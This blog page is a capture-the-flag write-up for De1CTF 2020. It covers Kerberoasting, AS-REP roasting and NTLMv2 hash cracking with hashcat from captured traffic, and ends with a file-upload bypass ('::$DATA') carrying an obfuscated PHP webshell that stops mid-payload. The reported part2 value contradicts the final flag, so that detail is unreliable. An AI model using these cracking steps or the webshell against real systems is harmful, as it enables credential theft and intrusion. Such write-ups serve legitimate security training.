<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Hard_Pentest &amp;&amp; Easy protocol题解 | 七友</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="ctf,pentest">
    <meta name="description" content="Easy ProtocolhintThe file header of hint is ‘MSCF’. After searching by google, we can see that this is a makecab compressed file. Use the expand command to extract hint.txt directly. hint.txt 1234hint">
<meta name="keywords" content="ctf,pentest">
<meta property="og:type" content="article">
<meta property="og:title" content="Hard_Pentest &amp;&amp; Easy protocol题解">
<meta property="og:url" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/index.html">
<meta property="og:site_name" content="七友">
<meta property="og:description" content="Easy ProtocolhintThe file header of hint is ‘MSCF’. After searching by google, we can see that this is a makecab compressed file. Use the expand command to extract hint.txt directly. hint.txt 1234hint">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/9.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/10.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/8.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/4.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/5.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/6.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/7.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/1.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/2.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/3.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/4.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/6.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/5.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/8.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/9.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/10.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/11.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/12.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/13.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/14.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/38.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/27.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/28.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/30.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/31.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/32.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/36.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/35.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/37.png">
<meta property="og:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/9.gif">
<meta property="og:updated_time" content="2020-06-06T02:04:04.457Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hard_Pentest &amp;&amp; Easy protocol题解">
<meta name="twitter:description" content="Easy ProtocolhintThe file header of hint is ‘MSCF’. After searching by google, we can see that this is a makecab compressed file. Use the expand command to extract hint.txt directly. hint.txt 1234hint">
<meta name="twitter:image" content="https://byqiyou.github.io/2020/05/06/De1CTF2020-en/img/9.png">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname"></h5>
          <a href="mailto:hack2fun@foxmail.com" title="hack2fun@foxmail.com" class="mail">hack2fun@foxmail.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/byqiyou" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/friends"  >
                <i class="icon icon-lg icon-friends"></i>
                Friends
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-about"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Hard_Pentest &amp;&amp; Easy protocol题解</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Hard_Pentest &amp;&amp; Easy protocol题解</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-05-06T02:25:01.000Z" itemprop="datePublished" class="page-time">
  2020-05-06
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Easy-Protocol"><span class="post-toc-number">1.</span> <span class="post-toc-text">Easy Protocol</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hint"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">hint</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#part1"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">part1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#part2"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">part2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#part3"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">part3</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hard-Pentest"><span class="post-toc-number">2.</span> <span class="post-toc-text">Hard_Pentest</span></a></li></ol>
        </nav>
    </aside>


<article id="post-De1CTF2020-en"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Hard_Pentest && Easy protocol题解</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-05-06 10:25:01" datetime="2020-05-06T02:25:01.000Z"  itemprop="datePublished">2020-05-06</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Easy-Protocol"><a href="#Easy-Protocol" class="headerlink" title="Easy Protocol"></a>Easy Protocol</h1><h2 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h2><p>The file header of hint is ‘MSCF’. After searching by google, we can see that this is a makecab compressed file. Use the expand command to extract hint.txt directly.</p>
<p>hint.txt</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hint1: flag is De1CTF{part1_part2_part3}</span><br><span class="line">hint2: The part1,part2 and part3 is a pure number with a length of 8</span><br><span class="line"></span><br><span class="line">have fun!!!!!</span><br></pre></td></tr></tbody></table></figure>
<p>hint.txt should be related to the traffic packet, just ignore it for now</p>
<h2 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h2><p>Take a look at the traffic packets, and mainly focus on the Kerberos protocol and the LDAP protocol. Simply follow the LDAP and find that the filtering conditions are: <code>(&amp;(&amp;(&amp;(samAccountType=805306368)(servicePrincipalName=*))(samAccountName=De1CTF2020))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))</code>Mainly this <code>servicePrincipalName=*</code>, querying all existing SPNs of domain user ‘de1ctf2020’</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/9.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Then there is a tgs-req request</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/10.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Back to hint, it’s supposed to be a brute force attack or something, and then guess <code>kerberosting</code></p>
<p>Then extract the SPN in TGS-REQ and the <code>enc-part</code> of the ticket</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/8.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Constructed into a hash format supported by hashcat,      <code>$krb5tgs$23$*&lt;USERNAME&gt;$&lt;DOMAIN&gt;$&lt;SPN&gt;*$&lt;FIRST_16_BYTES&gt;$&lt;REMAINING_BYTES&gt;</code></p>
<p>Then brute force</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 13100 $krb5tgs$23$*De1CTF2020$test.local$part1/De1CTF2020*$b9bac2cd9555738bc4f8a38b7aa3b01d$12befde687b62d10d325ebc03e0dd0d6bca1f526240dfa6d23dc5bcafc224591dcf4ba97bf6219cfbe16f1b59d289800fdcc8f051626b7fe0c2343d860087c45b68d329fd1107cebe4e537f77f9eea0834ae8018a4fe8518f1c69be95667fd69dcc590d3d443a8530ff8e38ee7f7b6e378d64a8b43b985bcc20f941947ea9e8463fd7e0fa77f284368b9b489f6d557da1e02990cfc725723e5d452ff6e659717947805b852ad734c5acc8011e535b96cef3af796610196d31c725362f7426e0cf92985ffe0717baaf5066fdba760b90e2c9b7e15bc9a4952cff47d4a092d3be6128997f9ff85dbafb85a5569b5d021b2a23c6371cbdf8beaa68b332e6ba1c1a8dc43c50695498ed8c2dfbf11760af35e1b913cd36b8015df37a146d2696c8b6b5f2ce375f2674acc0ce04aa98b9d21291466ce7a2aeb5a72fda17fa53e5b41df67d3898457d05fc899096092b3aa5bc333cb75eb5eee4b1c33356e72d9d28d6d674a5e47f64c72afb580e8d4f713a5ae265a4c825c39c19313a532a23c27eaf24bcde29c5e65c13cc057e0db72094bcedb6049574e35e511847f460180ddd78f4c9187345b1068bd608ca238c20d200ffa7e3891d076fe6fcef93d044c79f5ec9fb33561a35acf785b2a203df6d07e39161d9d3cedbe6d4394bd2bf43e545acd03f796c7863d684f9db4a5eef070f71e58a4882c2387d0705f4bed32fd7986dd672a15f6cfa56fe127af7c157216b2ea4f61ab7963d9dcaf4bb9222a7cba86d6a5e6c24833ffbf1957d90224764a01e0cb5a90f12dfea4ddaef23e30c2bdafcbcd99031db5d0698c1a050fc679213a8b81b854c08686f43241a4ec937c71cd09c9519fa2bba3aa845c4e84dbd6d9bbc3a62c876fb4c30bfa7960f0f51587ece14a31add698b1b9743e14fc343394f8a346c8e24cc8c26a8f8246f6a68928d0118dea81fea9976af3c57fa4c764f565e458e065d5a2a3dd1b083f7851d4ae1b791ada853e9a20e5b169ea0b8b582711f04df4dad8b461771dda5fca11c3f8f82d85e657bbd57d12cf15c8bbce7ad6cd1ebf540c45aefd4aef2ec828b06f208bd57be6a5529481b9f8b8fad5962e86b349a720ec2a1380ed711ee0261b29383907dae6f7a45d3fff54efae7ace1f4d7193f4a4d932699a41c3deb3ba9934278942e8f09ecd4339de4059dd3ff06b78e773b6ab9826df7ea2a443dddd55cdf79db1f76e2f05105e6cc5f0c4bd494b9556d921c6cb3fa48d1ddd27cf077ebd3e44b716fc74d1115b293e348fb9676e6727a3a97a7c2b86e8b83d8f90b9bf628c71e56aabcac381a32d493db3f255378c498a0bf527a9677cb81ec89911a9b09d6ffe16e2f2de63728439f8275d9f6feac2da860c5aab772034b2b0b962c033f8102ac86b2a9b07a82e9c70be65fe371e9d296afbe0e7272b90256428553c6a4fb0a8f5290098e4dad4021d99a65f2a3fa4ad0d2f ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></tbody></table></figure>
<p>Get Part1: 79345612</p>
<h2 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h2><p>This is actually the process of <code>AS-REPRoasting</code>. The judgment process is as follows</p>
<p>Follow up the LDAP query request and found that there is such a filter condition: <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/4.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/5.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>The value of <code>DONT_REQ_PREAUTH</code> is<code>4194304</code>, In other words, this LDAP request is to find the user who has enabled <code>Do not require Kerberos preauthentication</code>, If the user has turned on <code>Do not require Kerberos preauthentication</code>, then he can brute force the user’s credentials through<code>AS-REPRoasting</code>.</p>
<p>There is another way to judge is that when the AS-REQ request is sent in the first step, AS-REP returned an <code>eRR-PROAUTH-REQUIRED</code> error, but this method cannot completely determine that it is<code>AS-REPRoasting</code>, because in the default case, the <code>Windows Kerberos</code> client does not include pre-authentication information in the first request, so this situation also occurs during normal authentication. <code>eRR-PROAUTH-REQUIRED</code> is just to further verify our guess of<code>AS-REPRoasting</code> above</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/6.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Guess it is after the AS-REPRoasting process, and then extract the <code>enc-part</code> part of the ticket from the AS-REP</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/7.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Constructed into a hash format supported by hashcat,  <code>$krb5asrep$23$&lt;PRINCIPAL_NAME&gt;:&lt;FIRST_16_BYTES&gt;$&lt;REMAINING_BYTES&gt;</code></p>
<p>Then brute force</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 18200 $krb5asrep$23$De1CTF2020@test.local:2a00ca98642914e2cebb2718e79cbfb6$9026dd00f0b130fd4c4fd71a80817ddd5aec619a9b2e9b53ae2309bde0a9796ebcfa90558e8aaa6f39350b8f6de3a815a7b62ec0c154fe5e2802070146068dc9db1dc981fb355c94ead296cdaefc9c786ce589b43b25fb5b7ddad819db2edecd573342eaa029441ddfdb26765ce01ff719917ba3d0e7ce71a0fae38f91d17cf26d139b377ea2eb5114a2d36a5f27983e8c4cb599d9a4a5ae31a24db701d0734c79b1d323fcf0fe574e8dcca5347a6fb98b7fc2e63ccb125a48a44d4158de940b4fd0c74c7436198380c03170835d4934965ef6a25299e3f1af107c2154f40598db8600c855b2b183 ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></tbody></table></figure>
<p>get part2:74212345</p>
<h2 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h2><p>This is an NTLM authentication process. You can extract the <code>Net-NTLM v2 hash</code> in the traffic packet. There are two methods. The first method is to extract the content of the<code>WWW-Authenticate</code> header. The second One method is to extract the various parts of the <code>Net-NTLM v2 hash</code> directly from the traffic packet.</p>
<p>Take the first method as an example here, extract the contents of the <code>WWW-Authenticate</code> header, and write a script to convert it into<code>Net-NTLM v2 hash</code></p>
<p>Referenceï¼š<a href="https://www.innovation.ch/personal/ronald/ntlm.html" target="_blank" rel="noopener">https://www.innovation.ch/personal/ronald/ntlm.html</a></p>
<p>python script</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">NTLM=<span class="string">"NTLM TlRMTVNTUAADAAAAGAAYAH4AAAAkASQBlgAAAAgACABYAAAAFAAUAGAAAAAKAAoAdAAAAAAAAAC6AQAABYKIogoAY0UAAAAPZ+qOBf/ZoMFgp+YUgxdqNVQARQBTAFQARABlADEAQwBUAEYAMgAwADIAMABXAEkATgAxADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtZkcwqDVhdD4EzWOqvx0EgEBAAAAAAAAEwy5ECMI1gHSKQvAwlYXqAAAAAACAAgAVABFAFMAVAABAAwARABNADIAMAAxADIABAAUAHQAZQBzAHQALgBsAG8AYwBhAGwAAwAiAGQAbQAyADAAMQAyAC4AdABlAHMAdAAuAGwAbwBjAGEAbAAFABQAdABlAHMAdAAuAGwAbwBjAGEAbAAHAAgAEwy5ECMI1gEGAAQAAgAAAAgAMAAwAAAAAAAAAAAAAAAAEAAA7Ko9RN3EZAJsRTIGgTqvoLkY8q1D1Jfvj7a+sggyWKQKABAAAAAAAAAAAAAAAAAAAAAAAAkAHgBIAFQAVABQAC8AdABlAHMAdAAuAGwAbwBjAGEAbAAAAAAAAAAAAA=="</span></span><br><span class="line">b64_challenge=<span class="string">"NTLM TlRMTVNTUAACAAAACAAIADgAAAAFgomiVohvkPy3Pe0AAAAAAAAAAIIAggBAAAAABgOAJQAAAA9UAEUAUwBUAAIACABUAEUAUwBUAAEADABEAE0AMgAwADEAMgAEABQAdABlAHMAdAAuAGwAbwBjAGEAbAADACIAZABtADIAMAAxADIALgB0AGUAcwB0AC4AbABvAGMAYQBsAAUAFAB0AGUAcwB0AC4AbABvAGMAYQBsAAcACAATDLkQIwjWAQAAAAA="</span></span><br><span class="line">challenge= b64_challenge[<span class="number">5</span>:].decode(<span class="string">"base64"</span>)[<span class="number">24</span>:<span class="number">24</span>+<span class="number">8</span>].encode(<span class="string">"hex"</span>)</span><br><span class="line">message = NTLM[<span class="number">5</span>:].decode(<span class="string">"base64"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg2str</span><span class="params">(msg,start,uni=True)</span>:</span></span><br><span class="line">    len = ord(msg[start+<span class="number">1</span>])*<span class="number">256</span> + ord(msg[start])</span><br><span class="line">    offset = ord(msg[start+<span class="number">5</span>])*<span class="number">256</span> + ord(msg[start+<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">if</span> uni:</span><br><span class="line">        <span class="keyword">return</span> (msg[offset:offset+len]).replace(<span class="string">"\x00"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> msg[offset:offset+len]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user = msg2str(message,<span class="number">36</span>)</span><br><span class="line">domain = msg2str(message,<span class="number">28</span>)</span><br><span class="line">response = msg2str(message,<span class="number">20</span>,<span class="literal">False</span>)</span><br><span class="line">NTProofStr = response[<span class="number">0</span>:<span class="number">16</span>].encode(<span class="string">"hex"</span>)</span><br><span class="line">blob = response[<span class="number">16</span>:].encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"{user}::{domain}:{challenge}:{NTProofStr}:{blob}"</span>.format(user=user,domain=domain,challenge=challenge,NTProofStr=NTProofStr,blob=blob))</span><br></pre></td></tr></tbody></table></figure>
<p>get <code>Net-NTLM v2 hash</code></p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF2020::TEST:56886f90fcb73ded:b5991cc2a0d585d0f813358eaafc7412:0101000000000000130cb9102308d601d2290bc0c25617a80000000002000800540045005300540001000c0044004d0032003000310032000400140074006500730074002e006c006f00630061006c000300220064006d0032003000310032002e0074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800130cb9102308d60106000400020000000800300030000000000000000000000000100000ecaa3d44ddc464026c453206813aafa0b918f2ad43d497ef8fb6beb2083258a40a0010000000000000000000000000000000000009001e0048005400540050002f0074006500730074002e006c006f00630061006c000000000000000000</span><br></pre></td></tr></tbody></table></figure>
<p>Then use hashcat to brute force</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 5600 De1CTF2020::TEST:56886f90fcb73ded:b5991cc2a0d585d0f813358eaafc7412:0101000000000000130cb9102308d601d2290bc0c25617a80000000002000800540045005300540001000c0044004d0032003000310032000400140074006500730074002e006c006f00630061006c000300220064006d0032003000310032002e0074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800130cb9102308d60106000400020000000800300030000000000000000000000000100000ecaa3d44ddc464026c453206813aafa0b918f2ad43d497ef8fb6beb2083258a40a0010000000000000000000000000000000000009001e0048005400540050002f0074006500730074002e006c006f00630061006c000000000000000000 ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></tbody></table></figure>
<p>get part3: <code>74212345</code></p>
<p>So the final flag is: De1CTF{79345612_15673223_74212345}</p>
<h1 id="Hard-Pentest"><a href="#Hard-Pentest" class="headerlink" title="Hard_Pentest"></a>Hard_Pentest</h1><p>easy bypass</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 47.113.219.76</span><br><span class="line">Content-Length: 1918</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://47.113.219.76</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://47.113.219.76/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">Content-Disposition: form-data; name="file"; filename="1.php::$DATA"</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?=$_=[]?&gt;&lt;?=$_=@"$_"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___ =$__?&gt;</span><br><span class="line">&lt;?=$____=$___?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__.$___?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$____='_'?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span 